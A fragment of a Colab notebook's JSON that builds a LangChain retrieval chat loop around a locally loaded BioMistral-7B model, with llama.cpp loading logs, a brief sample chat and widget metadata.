        "from langchain.schema.output_parser import StrOutputParser\n",
        "from langchain.prompts import ChatPromptTemplate\n",
        "\n",
        "template = \"\"\"\n",
        "<|context|>\n",
        "You are an AI assistant that follows instruction extremely well.\n",
        "Please be truthful and give direct answers\n",
        "</s>\n",
        "<|user|>\n",
        "{query}\n",
        "</s>\n",
        " <|assistant|>\n",
        "\"\"\"\n",
        "\n",
        "prompt = ChatPromptTemplate.from_template(template)\n",
        "rag_chain = (\n",
        "    {\"context\": retriever, \"query\": RunnablePassthrough()}\n",
        "    | prompt\n",
        "    | llm\n",
        "    | StrOutputParser()\n",
        ")\n",
        "\n",
        "# Interactive Loop\n",
        "while True:\n",
        "    user_input = input(f\"Input Prompt: \")\n",
        "    if user_input == 'exit':\n",
        "        print('Exiting')\n",
        "        speak('Exiting')\n",
        "        sys.exit()\n",
        "    if user_input == '':\n",
        "        continue\n",
        "    result = rag_chain.invoke(user_input)\n",
        "    print(\"Answer: \", result)\n",
        "    speak(result)\n"
      ],
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hTlg-H2AIxGe",
        "outputId": "83ea8bb2-d1d7-474c-e4f9-dd82ebef8b44"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\"/content/drive\", force_remount=True).\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "llama_model_loader: loaded meta data with 21 key-value pairs and 291 tensors from /content/drive/MyDrive/Pdf/Bio/BioMistral-7B.Q4_K_M.gguf (version GGUF V3 (latest))\n",
            "llama_model_loader: Dumping metadata keys/values. Note: KV overrides do not apply in this output.\n",
            "llama_model_loader: - kv   0:                       general.architecture str              = llama\n",
            "llama_model_loader: - kv   1:                               general.name str              = hub\n",
            "llama_model_loader: - kv   2:                       llama.context_length u32              = 32768\n",
            "llama_model_loader: - kv   3:                     llama.embedding_length u32              = 4096\n",
            "llama_model_loader: - kv   4:                          llama.block_count u32              = 32\n",
            "llama_model_loader: - kv   5:                  llama.feed_forward_length u32              = 14336\n",
            "llama_model_loader: - kv   6:                 llama.rope.dimension_count u32              = 128\n",
            "llama_model_loader: - kv   7:                 llama.attention.head_count u32              = 32\n",
            "llama_model_loader: - kv   8:              llama.attention.head_count_kv u32              = 8\n",
            "llama_model_loader: - kv   9:     llama.attention.layer_norm_rms_epsilon f32              = 0.000010\n",
            "llama_model_loader: - kv  10:                       llama.rope.freq_base f32              = 10000.000000\n",
            "llama_model_loader: - kv  11:                          general.file_type u32              = 15\n",
            "llama_model_loader: - kv  12:                       tokenizer.ggml.model str              = llama\n",
            "llama_model_loader: - kv  13:                      tokenizer.ggml.tokens arr[str,32000]   = [\"<unk>\", \"<s>\", \"</s>\", \"<0x00>\", \"<...\n",
            "llama_model_loader: - kv  14:                      tokenizer.ggml.scores arr[f32,32000]   = [0.000000, 0.000000, 0.000000, 0.0000...\n",
            "llama_model_loader: - kv  15:                  tokenizer.ggml.token_type arr[i32,32000]   = [2, 3, 3, 6, 6, 6, 6, 6, 6, 6, 6, 6, ...\n",
            "llama_model_loader: - kv  16:                tokenizer.ggml.bos_token_id u32              = 1\n",
            "llama_model_loader: - kv  17:                tokenizer.ggml.eos_token_id u32              = 2\n",
            "llama_model_loader: - kv  18:            tokenizer.ggml.unknown_token_id u32              = 0\n",
            "llama_model_loader: - kv  19:                    tokenizer.chat_template str              = {{ bos_token }}{% for message in mess...\n",
            "llama_model_loader: - kv  20:               general.quantization_version u32              = 2\n",
            "llama_model_loader: - type  f32:   65 tensors\n",
            "llama_model_loader: - type q4_K:  193 tensors\n",
            "llama_model_loader: - type q6_K:   33 tensors\n",
            "llm_load_vocab: special tokens cache size = 3\n",
            "llm_load_vocab: token to piece cache size = 0.1637 MB\n",
            "llm_load_print_meta: format           = GGUF V3 (latest)\n",
            "llm_load_print_meta: arch             = llama\n",
            "llm_load_print_meta: vocab type       = SPM\n",
            "llm_load_print_meta: n_vocab          = 32000\n",
            "llm_load_print_meta: n_merges         = 0\n",
            "llm_load_print_meta: vocab_only       = 0\n",
            "llm_load_print_meta: n_ctx_train      = 32768\n",
            "llm_load_print_meta: n_embd           = 4096\n",
            "llm_load_print_meta: n_layer          = 32\n",
            "llm_load_print_meta: n_head           = 32\n",
            "llm_load_print_meta: n_head_kv        = 8\n",
            "llm_load_print_meta: n_rot            = 128\n",
            "llm_load_print_meta: n_swa            = 0\n",
            "llm_load_print_meta: n_embd_head_k    = 128\n",
            "llm_load_print_meta: n_embd_head_v    = 128\n",
            "llm_load_print_meta: n_gqa            = 4\n",
            "llm_load_print_meta: n_embd_k_gqa     = 1024\n",
            "llm_load_print_meta: n_embd_v_gqa     = 1024\n",
            "llm_load_print_meta: f_norm_eps       = 0.0e+00\n",
            "llm_load_print_meta: f_norm_rms_eps   = 1.0e-05\n",
            "llm_load_print_meta: f_clamp_kqv      = 0.0e+00\n",
            "llm_load_print_meta: f_max_alibi_bias = 0.0e+00\n",
            "llm_load_print_meta: f_logit_scale    = 0.0e+00\n",
            "llm_load_print_meta: n_ff             = 14336\n",
            "llm_load_print_meta: n_expert         = 0\n",
            "llm_load_print_meta: n_expert_used    = 0\n",
            "llm_load_print_meta: causal attn      = 1\n",
            "llm_load_print_meta: pooling type     = 0\n",
            "llm_load_print_meta: rope type        = 0\n",
            "llm_load_print_meta: rope scaling     = linear\n",
            "llm_load_print_meta: freq_base_train  = 10000.0\n",
            "llm_load_print_meta: freq_scale_train = 1\n",
            "llm_load_print_meta: n_ctx_orig_yarn  = 32768\n",
            "llm_load_print_meta: rope_finetuned   = unknown\n",
            "llm_load_print_meta: ssm_d_conv       = 0\n",
            "llm_load_print_meta: ssm_d_inner      = 0\n",
            "llm_load_print_meta: ssm_d_state      = 0\n",
            "llm_load_print_meta: ssm_dt_rank      = 0\n",
            "llm_load_print_meta: ssm_dt_b_c_rms   = 0\n",
            "llm_load_print_meta: model type       = 7B\n",
            "llm_load_print_meta: model ftype      = Q4_K - Medium\n",
            "llm_load_print_meta: model params     = 7.24 B\n",
            "llm_load_print_meta: model size       = 4.07 GiB (4.83 BPW) \n",
            "llm_load_print_meta: general.name     = hub\n",
            "llm_load_print_meta: BOS token        = 1 '<s>'\n",
            "llm_load_print_meta: EOS token        = 2 '</s>'\n",
            "llm_load_print_meta: UNK token        = 0 '<unk>'\n",
            "llm_load_print_meta: LF token         = 13 '<0x0A>'\n",
            "llm_load_print_meta: max token length = 48\n",
            "llm_load_tensors: ggml ctx size =    0.14 MiB\n",
            "llm_load_tensors:        CPU buffer size =  4165.37 MiB\n",
            ".................................................................................................\n",
            "llama_new_context_with_model: n_batch is less than GGML_KQ_MASK_PAD - increasing to 32\n",
            "llama_new_context_with_model: n_ctx      = 512\n",
            "llama_new_context_with_model: n_batch    = 32\n",
            "llama_new_context_with_model: n_ubatch   = 32\n",
            "llama_new_context_with_model: flash_attn = 0\n",
            "llama_new_context_with_model: freq_base  = 10000.0\n",
            "llama_new_context_with_model: freq_scale = 1\n",
            "llama_kv_cache_init:        CPU KV buffer size =    64.00 MiB\n",
            "llama_new_context_with_model: KV self size  =   64.00 MiB, K (f16):   32.00 MiB, V (f16):   32.00 MiB\n",
            "llama_new_context_with_model:        CPU  output buffer size =     0.12 MiB\n",
            "llama_new_context_with_model:        CPU compute buffer size =     5.06 MiB\n",
            "llama_new_context_with_model: graph nodes  = 1030\n",
            "llama_new_context_with_model: graph splits = 1\n",
            "AVX = 1 | AVX_VNNI = 0 | AVX2 = 1 | AVX512 = 0 | AVX512_VBMI = 0 | AVX512_VNNI = 0 | AVX512_BF16 = 0 | FMA = 1 | NEON = 0 | SVE = 0 | ARM_FMA = 0 | F16C = 1 | FP16_VA = 0 | WASM_SIMD = 0 | BLAS = 0 | SSE3 = 1 | SSSE3 = 1 | VSX = 0 | MATMUL_INT8 = 0 | LLAMAFILE = 1 | \n",
            "Model metadata: {'tokenizer.chat_template': \"{{ bos_token }}{% for message in messages %}{% if (message['role'] == 'user') != (loop.index0 % 2 == 0) %}{{ raise_exception('Conversation roles must alternate user/assistant/user/assistant/...') }}{% endif %}{% if message['role'] == 'user' %}{{ '[INST] ' + message['content'] + ' [/INST]' }}{% elif message['role'] == 'assistant' %}{{ message['content'] + eos_token + ' ' }}{% else %}{{ raise_exception('Only user and assistant roles are supported!') }}{% endif %}{% endfor %}\", 'tokenizer.ggml.unknown_token_id': '0', 'tokenizer.ggml.eos_token_id': '2', 'general.architecture': 'llama', 'llama.rope.freq_base': '10000.000000', 'llama.context_length': '32768', 'general.name': 'hub', 'llama.embedding_length': '4096', 'llama.feed_forward_length': '14336', 'llama.attention.layer_norm_rms_epsilon': '0.000010', 'llama.rope.dimension_count': '128', 'tokenizer.ggml.bos_token_id': '1', 'llama.attention.head_count': '32', 'llama.block_count': '32', 'llama.attention.head_count_kv': '8', 'general.quantization_version': '2', 'tokenizer.ggml.model': 'llama', 'general.file_type': '15'}\n",
            "Available chat formats from metadata: chat_template.default\n",
            "Guessed chat format: mistral-instruct\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Input Prompt: hi\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "\n",
            "llama_print_timings:        load time =    4644.23 ms\n",
            "llama_print_timings:      sample time =       6.12 ms /    10 runs   (    0.61 ms per token,  1635.06 tokens per second)\n",
            "llama_print_timings: prompt eval time =   27378.14 ms /    53 tokens (  516.57 ms per token,     1.94 tokens per second)\n",
            "llama_print_timings:        eval time =    6395.15 ms /     9 runs   (  710.57 ms per token,     1.41 tokens per second)\n",
            "llama_print_timings:       total time =   33789.95 ms /    62 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  Hi! How can I assist you today?\n",
            "Input Prompt: where\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 12 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    4644.23 ms\n",
            "llama_print_timings:      sample time =      24.48 ms /    42 runs   (    0.58 ms per token,  1715.62 tokens per second)\n",
            "llama_print_timings: prompt eval time =    5076.56 ms /    12 tokens (  423.05 ms per token,     2.36 tokens per second)\n",
            "llama_print_timings:        eval time =   25746.17 ms /    41 runs   (  627.96 ms per token,     1.59 tokens per second)\n",
            "llama_print_timings:       total time =   30882.90 ms /    53 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  Hello! How can I assist you today? Please be specific in your question so I can provide the most accurate answer. Remember to be truthful and concise in your questions. Have a nice day!\n",
            "Input Prompt: good mrg\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 14 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    4644.23 ms\n",
            "llama_print_timings:      sample time =       6.69 ms /    11 runs   (    0.61 ms per token,  1645.47 tokens per second)\n",
            "llama_print_timings: prompt eval time =    4899.65 ms /    14 tokens (  349.98 ms per token,     2.86 tokens per second)\n",
            "llama_print_timings:        eval time =    6904.92 ms /    10 runs   (  690.49 ms per token,     1.45 tokens per second)\n",
            "llama_print_timings:       total time =   11823.45 ms /    24 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  Good morning! How can I assist you today?\n",
            "Input Prompt: print 10 nombers\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 17 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    4644.23 ms\n",
            "llama_print_timings:      sample time =      23.58 ms /    44 runs   (    0.54 ms per token,  1865.91 tokens per second)\n",
            "llama_print_timings: prompt eval time =    8114.85 ms /    16 tokens (  507.18 ms per token,     1.97 tokens per second)\n",
            "llama_print_timings:        eval time =   27125.69 ms /    44 runs   (  616.49 ms per token,     1.62 tokens per second)\n",
            "llama_print_timings:       total time =   35299.04 ms /    60 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  ok, here are ten numbers 2,4,6,8,10,12,14,16,18,20. Is there anything else I can help you with?\n",
            "Input Prompt: print 1 to 10 nombers\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 44 prefix-match hit, remaining 17 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    4644.23 ms\n",
            "llama_print_timings:      sample time =      25.52 ms /    47 runs   (    0.54 ms per token,  1842.05 tokens per second)\n",
            "llama_print_timings: prompt eval time =    8044.20 ms /    16 tokens (  502.76 ms per token,     1.99 tokens per second)\n",
            "llama_print_timings:        eval time =   29673.82 ms /    47 runs   (  631.36 ms per token,     1.58 tokens per second)\n",
            "llama_print_timings:       total time =   37782.16 ms /    63 tokens\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Answer:   Sure, here are the numbers from 1 to 10: 1 2 3 4 5 6 7 8 9 10. Is there anything else I can help you with?\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "joOjZC_nnanl"
      },
      "source": []
    }
  ],
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "gpuType": "T4",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "1f034c617d3349a9a03a8616570eaa08": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_73a5f3ba2c614b1ba5a6364b54733560",
              "IPY_MODEL_4e47c50f05b54c41a4a158d7e50684c4",
              "IPY_MODEL_76607c93072d4a21ae103af71b43d350"
            ],
            "layout": "IPY_MODEL_ba8499c6e8c44e55ae5e03c6a19e70ec"
          }
        },
        "73a5f3ba2c614b1ba5a6364b54733560": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_bdf0a5846a1d48069ccb41e2f90c20dd",
            "placeholder": "​",
            "style": "IPY_MODEL_20bc18e3ffd94716af3e5ea0ca06443d",
            "value": "modules.json: 100%"
          }
        },
        "4e47c50f05b54c41a4a158d7e50684c4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_e8961204b28947e29ce44941e92b2d58",
            "max": 349,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_b8ba0c98c65d4d9d9f3abf467373c5ff",
            "value": 349
          }
        },
        "76607c93072d4a21ae103af71b43d350": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9bc4f2584076448fb4253001b4d8b292",
            "placeholder": "​",
            "style": "IPY_MODEL_a342f3e0c16b4bd28795d9bcb80c0a1c",
            "value": " 349/349 [00:00&lt;00:00, 16.5kB/s]"
          }
        },
        "ba8499c6e8c44e55ae5e03c6a19e70ec": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "bdf0a5846a1d48069ccb41e2f90c20dd": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "20bc18e3ffd94716af3e5ea0ca06443d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "e8961204b28947e29ce44941e92b2d58": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b8ba0c98c65d4d9d9f3abf467373c5ff": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "9bc4f2584076448fb4253001b4d8b292": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a342f3e0c16b4bd28795d9bcb80c0a1c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7c7303d01d924ab9ba8fa1d43a1303e5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_7fd68fd522864c20a8d589ca69c8a616",
              "IPY_MODEL_6edbdba12d3d44c19e12ce909eb7daa5",
              "IPY_MODEL_5e5d0c2c2e18444f84fff3dc66c2d6f9"
            ],
            "layout": "IPY_MODEL_36beca128bc94908b8a908856ed88a1f"
          }
        },
        "7fd68fd522864c20a8d589ca69c8a616": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_b7e5ac4daf5d40708d3430355d3da8da",
            "placeholder": "​",
            "style": "IPY_MODEL_ee23a2ec3c3a4142bae90e6447ebba56",
            "value": "config_sentence_transformers.json: 100%"
          }
        },
        "6edbdba12d3d44c19e12ce909eb7daa5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_64941dc8e25445c2b7653ac8e88aeb08",
            "max": 124,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_b896876c5567464198c943e8697c48c9",
            "value": 124
          }
        },
        "5e5d0c2c2e18444f84fff3dc66c2d6f9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_4c46224e35cb4d8493b9710e555118b4",
            "placeholder": "​",
            "style": "IPY_MODEL_bac558f35e974dc89c18bbd62be2f7c3",
            "value": " 124/124 [00:00&lt;00:00, 7.80kB/s]"
          }
        },
        "36beca128bc94908b8a908856ed88a1f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b7e5ac4daf5d40708d3430355d3da8da": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ee23a2ec3c3a4142bae90e6447ebba56": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "64941dc8e25445c2b7653ac8e88aeb08": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b896876c5567464198c943e8697c48c9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "4c46224e35cb4d8493b9710e555118b4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
